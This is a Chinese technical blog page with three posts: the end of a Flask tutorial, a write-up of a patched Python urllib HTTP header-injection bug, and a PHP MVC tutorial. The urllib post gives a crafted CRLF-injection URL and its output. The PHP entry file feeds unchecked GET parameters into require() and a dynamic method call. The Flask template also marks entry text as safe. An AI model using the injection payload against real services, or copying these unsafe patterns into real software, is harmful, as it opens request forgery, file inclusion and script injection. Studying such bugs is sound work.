class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Share</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  &amp;#123;% endif %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">entries</span>&gt;</span></span><br><span class="line">  &amp;#123;% for entry in entries %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&amp;#123;&amp;#123; entry.title &amp;#125;&amp;#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>&amp;#123;&amp;#123; entry.text|safe &amp;#125;&amp;#125;</span><br><span class="line">  &amp;#123;% else %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>Unbelievable.  No entries here so far<span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line">  &amp;#123;% endfor %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">&amp;#123;% endblock %&amp;#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="login-html"><a href="#login-html" class="headerlink" title="login.html"></a>login.html</h3><p>最后是登录模板，基本上只显示一个允许用户登录的表单。</p>
<p>在 flaskr/templates 目录下新建 login.html 文件并写入如下代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% extends "layout.html" %&amp;#125;</span><br><span class="line">&amp;#123;% block body %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  &amp;#123;% if error %&amp;#125;<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">error</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Error:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> &amp;#123;&amp;#123; error &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"&amp;#123;&amp;#123; url_for('login') &amp;#125;&amp;#125;"</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Username:</span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">username</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Password:</span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Login</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&amp;#123;% endblock %&amp;#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="添加样式"><a href="#添加样式" class="headerlink" title="添加样式"></a>添加样式</h3><p>现在其它一切都正常工作，是时候给应用添加些样式。</p>
<p>在 Code/flaskr/static 目录下新建 style.css 样式文件并写入如下代码：<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>            &amp;<span class="selector-id">#123</span>; <span class="attribute">font-family</span>: sans-serif; <span class="attribute">background</span>: <span class="number">#eee</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-tag">a</span>, <span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>       &amp;<span class="selector-id">#123</span>; <span class="attribute">color</span>: <span class="number">#377BA8</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>          &amp;<span class="selector-id">#123</span>; <span class="attribute">font-family</span>: <span class="string">'Georgia'</span>, serif; <span class="attribute">margin</span>: <span class="number">0</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-tag">h1</span>              &amp;<span class="selector-id">#123</span>; <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#eee</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-tag">h2</span>              &amp;<span class="selector-id">#123</span>; <span class="attribute">font-size</span>: <span class="number">1.2em</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.page</span>           &amp;<span class="selector-id">#123</span>; <span class="attribute">margin</span>: <span class="number">2em</span> auto; <span class="attribute">width</span>: <span class="number">35em</span>; <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">                  <span class="attribute">padding</span>: <span class="number">0.8em</span>; <span class="attribute">background</span>: white; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.entries</span>        &amp;<span class="selector-id">#123</span>; <span class="attribute">list-style</span>: none; <span class="attribute">margin</span>: <span class="number">0</span>; <span class="attribute">padding</span>: <span class="number">0</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.entries</span> <span class="selector-tag">li</span>     &amp;<span class="selector-id">#123</span>; <span class="attribute">margin</span>: <span class="number">0.8em</span> <span class="number">1.2em</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.entries</span> <span class="selector-tag">li</span> <span class="selector-tag">h2</span>  &amp;<span class="selector-id">#123</span>; <span class="attribute">margin-left</span>: -<span class="number">1em</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.add-entry</span>      &amp;<span class="selector-id">#123</span>; <span class="attribute">font-size</span>: <span class="number">0.9em</span>; <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.add-entry</span> <span class="selector-tag">dl</span>   &amp;<span class="selector-id">#123</span>; <span class="attribute">font-weight</span>: bold; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.metanav</span>        &amp;<span class="selector-id">#123</span>; <span class="attribute">text-align</span>: right; <span class="attribute">font-size</span>: <span class="number">0.8em</span>; <span class="attribute">padding</span>: <span class="number">0.3em</span>;</span><br><span class="line">                  <span class="attribute">margin-bottom</span>: <span class="number">1em</span>; <span class="attribute">background</span>: <span class="number">#fafafa</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.flash</span>          &amp;<span class="selector-id">#123</span>; <span class="attribute">background</span>: <span class="number">#CEE5F5</span>; <span class="attribute">padding</span>: <span class="number">0.5em</span>;</span><br><span class="line">                  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#AACBE2</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.error</span>          &amp;<span class="selector-id">#123</span>; <span class="attribute">background</span>: <span class="number">#F0D6D6</span>; <span class="attribute">padding</span>: <span class="number">0.5em</span>; &amp;<span class="selector-id">#125</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="运行应用"><a href="#运行应用" class="headerlink" title="运行应用"></a>运行应用</h2><p>这样我们就完成了简单博客应用的代码编写，现在在终端执行如下命令运行程序：（在这之前注意要配置数据库，如果没有配置可以参考上一个实验的步骤）<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> flaskr.<span class="keyword">py</span></span><br></pre></td></tr></table></figure></p>
<p>访问首页 <a href="http://127.0.0.1:5000" target="_blank" rel="noopener">http://127.0.0.1:5000</a> ，效果如下：</p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1d1eyb1a4j30sn09kgmk.jpg" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/23/flask框架学习/" data-id="cjvrp4gm300355gqrv22uip74" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Python-urllib-HTTP头注入漏洞" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/22/Python-urllib-HTTP头注入漏洞/" class="article-date">
  <time datetime="2019-03-22T11:24:59.000Z" itemprop="datePublished">2019-03-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/22/Python-urllib-HTTP头注入漏洞/">Python urllib HTTP头注入漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Python的urllib库（在Python2中为 urllib2 ，在Python3中为 urllib ）有一个HTTP协议下的协议流注入漏洞。如果攻击者可以控制Python代码访问任意URL或者让Python代码访问一个恶意的web servr，那这个漏洞可能会危害内网服务安全。<br>HTTP协议解析host的时候可以接受百分号编码的值，解码，然后包含在HTTP数据流里面，但是没有进一步的验证或者编码，这就可以注入一个换行符。<br>注:现在的python版本已经修复了<br><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!python</span></span><br><span class="line"><span class="meta">#!/usr/bin/env python3  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request   </span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]   </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure></p>
<p>这段代码只是从命令行参数接收一个URL，然后去访问它。为了查看 urllib 获取的HTTP头，我们用一个nc来监听端口。<br>在命令行输入<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -<span class="selector-tag">p</span> <span class="number">12345</span></span><br></pre></td></tr></table></figure></p>
<p>重新打开一个窗口运行py文件<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch3<span class="selector-class">.py</span> http:<span class="comment">//127.0.0.1:12345/style</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bi52sbu3j30qk07cmxh.jpg" alt=""></p>
<p>可以看到,在server得到了http请求头<br>然后我们使用恶意构造的地址<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fetch<span class="number">3</span>.py http://<span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">%0</span>d<span class="symbol">%0</span>aX-injected:<span class="symbol">%20</span>header<span class="symbol">%0</span>d<span class="symbol">%0</span>ax-leftover:<span class="symbol">%20</span>:<span class="number">12345</span>/foo</span><br></pre></td></tr></table></figure></p>
<p>返回的HTTP头就是<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!shell</span></span><br><span class="line"><span class="builtin-name">GET</span> /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">X-injected: header</span><br><span class="line">x-leftover: :12345</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></p>
<h1 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h1><h2 id="HTTP头注入和请求伪造"><a href="#HTTP头注入和请求伪造" class="headerlink" title="HTTP头注入和请求伪造"></a>HTTP头注入和请求伪造</h2><h2 id="攻击memcached"><a href="#攻击memcached" class="headerlink" title="攻击memcached"></a>攻击memcached</h2><h2 id="攻击Redis"><a href="#攻击Redis" class="headerlink" title="攻击Redis"></a>攻击Redis</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://strcpy.me/index.php/archives/749/" target="_blank" rel="noopener">https://strcpy.me/index.php/archives/749/</a><br><a href="http://www.anquan.us/static/drops/papers-16905.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/papers-16905.html</a><br><a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/106</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/22/Python-urllib-HTTP头注入漏洞/" data-id="cjvrp4gix000w5gqr8e1hq6aj" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-PHP-MVC开发框架学习" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/21/PHP-MVC开发框架学习/" class="article-date">
  <time datetime="2019-03-21T06:18:53.000Z" itemprop="datePublished">2019-03-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/21/PHP-MVC开发框架学习/">PHP MVC开发框架学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过学习MVC能够更深的了解一些mvc框架</p>
<h1 id="MVC-思想"><a href="#MVC-思想" class="headerlink" title="MVC 思想"></a>MVC 思想</h1><p>MVC是一个设计模式，它强制性的使应用程序的输入、处理和输出分开。使用MVC应用程序被分成三个核心部件：模型（M）、视图（V）、控制器（C），它们各自处理自己的任务。</p>
<p>视图：视图是用户看到并与之交互的界面。对老式的Web应用程序来说，视图就是由HTML元素组成的界面，在新式的Web应用程序中，HTML依旧在视图中扮演着重要的角色，但一些新的技术已层出不穷，它们包括Adobe Flash和象XHTML，XML/XSL，WML等一些标识语言和Web services。如何处理应用程序的界面变得越来越有挑战性。MVC一个大的好处是它能为你的应用程序处理很多不同的视图。在视图中其实没有真正的处理发生，不管这些数据是联机存储的还是一个雇员列表，作为视图来讲，它只是作为一种输出数据并允许用户操纵的方式。</p>
<p>模型：模型表示企业数据和业务规则。在MVC的三个部件中，模型拥有最多的处理任务。例如它可能用象EJBs和ColdFusion Components这样的构件对象来处理数据库。被模型返回的数据是中立的，就是说模型与数据格式无关，这样一个模型能为多个视图提供数据。由于应用于模型的代码只需写一次就可以被多个视图重用，所以减少了代码的重复性。</p>
<p>控制器：控制器接受用户的输入并调用模型和视图去完成用户的需求。所以当单击Web页面中的超链接和发送HTML表单时，控制器本身不输出任何东西和做任何处理。它只是接收请求并决定调用哪个模型构件去处理请求，然后确定用哪个视图来显示模型处理返回的数据。</p>
<h1 id="单一入口"><a href="#单一入口" class="headerlink" title="单一入口"></a>单一入口</h1><p>单一入口通常是指一个项目或者应用具有一个统一（但并不一定是唯一）的入口文件，也就是说项目的所有功能操作都是通过这个入口文件进行的，并且往往入口文件是第一步被执行的。</p>
<p>单一入口的好处是项目整体比较规范，因为同一个入口，往往其不同操作之间具有相同的规则。另外一个方面就是单一入口带来的好处是控制较为灵活，因为拦截方便了，类似如一些权限控制、用户登录方面的判断和操作可以统一处理了。</p>
<p>或者有些人会担心所有网站都通过一个入口文件进行访问，是否会造成太大的压力，其实这是杞人忧天的想法。</p>
<p>现在我们总结MVC的处理过程，首先控制器接收用户的请求，并决定应该调用哪个模型来进行处理，然后模型用业务逻辑来处理用户的请求并返回数据，最后控制器用相应的视图格式化模型返回的数据，并通过表示层呈现给用户。</p>
<p>一个典型的Web MVC流程：</p>
<p>Controller截获用户发出的请求；<br>Controller调用Model完成状态的读写操作；<br>Controller把数据传递给View；<br>View渲染最终结果并呈献给用户。</p>
<h1 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h1><p>MySQL的表名需小写或小写加下划线，如：item，car_orders。<br>模块名（Models）需用大驼峰命名法，即首字母大写，并在名称后添加Model，如：ItemModel，CarModel。<br>控制器（Controllers）需用大驼峰命名法，即首字母大写，并在名称后添加Controller，如：ItemController，CarController。<br>方法名（Action）需用小驼峰命名法，即首字母小写，如：index，indexPost。<br>视图（Views）部署结构为控制器名/行为名，如：item/view.php，car/buy.php。</p>
<p>对于只有 PHP 代码的文件，最好没有结束标志?&gt;，<br>PHP自身并不需要结束符号，不加结束符让程序更加安全，很大程度防止了末尾被注入额外的内容。</p>
<p>请求URL<br>ocalhost/index.php?c=demo&amp;a=index¶m=welcome</p>
<p>如果想得到更加优美的URL结构，可以进行优化，为由这URL结构优化与本文关系不大，以后进行分享。</p>
<p>从上面的参数可以看出，访问的文件是index.php，同时含有3个参数分别为c、a、param。</p>
<h1 id="MVC实现"><a href="#MVC实现" class="headerlink" title="MVC实现"></a>MVC实现</h1><p>首先来实现一个简单的MVC<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">├─www                       <span class="meta"># 网站根目录</span></span><br><span class="line">│  ├─controller             <span class="meta"># 控制器目录</span></span><br><span class="line">│  │  ├─democontroller.php  <span class="meta"># demo控制器</span></span><br><span class="line">│  ├─model                  <span class="meta"># 模型目录</span></span><br><span class="line">│  │  ├─model.php           <span class="meta"># model模型</span></span><br><span class="line">│  ├─view                   <span class="meta"># 视图目录</span></span><br><span class="line">│  │  ├─<span class="keyword">index</span>.php           <span class="meta"># index视图</span></span><br><span class="line">│  ├─<span class="keyword">index</span>.php              <span class="meta"># 入口文件</span></span><br></pre></td></tr></table></figure></p>
<p>/index.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">'controller/democontroller.php'</span>);</span></span><br><span class="line"><span class="php">$controller = <span class="keyword">new</span> DemoController();</span></span><br><span class="line"><span class="php">$controller-&gt;index();</span></span><br></pre></td></tr></table></figure></p>
<p>controller/democontroller.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>访问127.0.0.1/index.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1ablxog3cj30au03emx5.jpg" alt=""><br>如果使用下面的URL进行访问，可以预见不会有任何输出。<br>访问<a href="http://localhost/controller/democontroller.php" target="_blank" rel="noopener">http://localhost/controller/democontroller.php</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1abmuc7nfj30dp064wek.jpg" alt=""><br>只能通过index.php来访问，这也是为什么称它为入口文件的原因<br>现在来通过参数来调用不同的控制器<br>接下来改写index.php内容<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $c_str = $_GET[<span class="string">'c'</span>];  <span class="comment">// 获取控制器</span></span></span><br><span class="line"><span class="php"> $c_name = $c_str.<span class="string">'controller'</span>;</span></span><br><span class="line"><span class="php"> $c_path = <span class="string">'controller/'</span>.$c_name.<span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $method = $_GET[<span class="string">'a'</span>]; <span class="comment">//方法名</span></span></span><br><span class="line"><span class="php"> <span class="keyword">require</span>($c_path);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $controller = <span class="keyword">new</span> $c_name;</span></span><br><span class="line"><span class="php"> $controller-&gt;$method();</span></span><br></pre></td></tr></table></figure></p>
<p>访问<br><a href="http://localhost/index.php?c=demo&amp;a=index" target="_blank" rel="noopener">http://localhost/index.php?c=demo&amp;a=index</a><br>同样能够得到内容</p>
<p>接下来加入view,使用视图对象处理输出<br>view/index.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($output)</span> </span>&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">         <span class="keyword">echo</span> $output;</span></span><br><span class="line"><span class="php">     &#125;</span></span><br><span class="line"><span class="php"> &#125;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// controller/democontroller.php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">    $data = <span class="string">'Hello furzoom!'</span>;</span></span><br><span class="line"><span class="php">    <span class="comment">//echo 'hello world';</span></span></span><br><span class="line"><span class="php">    <span class="keyword">require</span>(<span class="string">'view/index.php'</span>);</span></span><br><span class="line"><span class="php">    $view = <span class="keyword">new</span> Index();</span></span><br><span class="line"><span class="php">    $view-&gt;display($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p> 访问 <a href="http://localhost/index.php?c=demo&amp;a=index" target="_blank" rel="noopener">http://localhost/index.php?c=demo&amp;a=index</a><br> <img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1acj5f1k6j30bn02zdfv.jpg" alt=""></p>
<p> 上面貌似已经很cool了，但是显示什么样的内容是在控制器中直接指定的，希望内容也由URL指定，这样将数据的处理交给模型来处理。<br>model/model.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// model/model.php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">private</span> $data = <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">    <span class="string">'title'</span> =&gt; <span class="string">'Hello style'</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'key'</span> =&gt; <span class="string">'welcome to style-404.github.io'</span>,</span></span><br><span class="line"><span class="php">  );</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($key)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">$this</span> -&gt;data[$key];</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>视图文件model.php定义了一个Model类，类中定义了一个getData()的方法，用于返回请求的数据。</p>
<p>同时修改入口文件index.php如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $c_str = $_GET[<span class="string">'c'</span>];  <span class="comment">// 获取控制器</span></span></span><br><span class="line"><span class="php"> $c_name = $c_str.<span class="string">'controller'</span>;</span></span><br><span class="line"><span class="php"> $c_path = <span class="string">'controller/'</span>.$c_name.<span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $method = $_GET[<span class="string">'a'</span>]; <span class="comment">//方法名</span></span></span><br><span class="line"><span class="php"> <span class="keyword">require</span>($c_path);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$param = $_GET[<span class="string">'param'</span>]; <span class="comment">// 增加参数</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $controller = <span class="keyword">new</span> $c_name;</span></span><br><span class="line"><span class="php"> $controller-&gt;$method($param);</span></span><br></pre></td></tr></table></figure>
<p>增加了一个参数$param，将其作为控制器的方法调用参数。</p>
